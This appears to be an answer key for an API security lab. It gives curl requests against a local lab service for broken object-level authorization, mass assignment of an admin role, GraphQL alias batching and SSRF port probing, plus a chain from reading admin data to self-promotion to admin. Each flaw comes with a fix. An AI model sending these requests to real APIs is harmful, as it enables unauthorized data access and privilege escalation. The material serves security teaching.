# API lab answers

## 1. BOLA

```bash
curl -s -H 'Authorization: Bearer bob-token' 'http://127.0.0.1:8103/api/users/3'
```

Bob reads admin. The handler checks that a token exists and then uses the id from the path. Fix it with an owner or a role check per object.

## 2. Mass assignment

```bash
curl -s -X PATCH -H 'Authorization: Bearer bob-token' -H 'Content-Type: application/json' \
  --data '{"role":"admin"}' 'http://127.0.0.1:8103/api/users/2'
```

The handler copies name, email and role from the body. Fix it with an explicit field allowlist.

## 3. GraphQL alias batching

```bash
QUERY='{a:user(id:1){name} b:user(id:2){name} c:user(id:3){name}}'
curl -s --get --data-urlencode "query=$QUERY" 'http://127.0.0.1:8103/graphql'
```

Three lookups in one request. Ten aliases is ten lookups. Fix it with a query cost limit or a rate limit on operations.

## 4. SSRF

```bash
curl -s --get --data-urlencode 'url=http://127.0.0.1:8103/health' 'http://127.0.0.1:8103/api/export'
curl -s --get --data-urlencode 'url=http://127.0.0.1:1/' 'http://127.0.0.1:8103/api/export'
```

The first returns ok and the second a connection error. Fix it with an allowlist and a resolved IP pin.

## 5. Fixes

- Object owner or role check on every read and write.
- Field allowlist on the update.
- Query cost and alias limit.
- URL allowlist and a DNS pin.

## 6. Chain

Bob reads admin by BOLA, then changes his own role to admin by mass assignment. The first gives the target, the second gives the right.

## 7. Token versus authorization

The token proves who the caller is. The object id proves nothing. The server must compare the object owner or the role with the caller before the response.
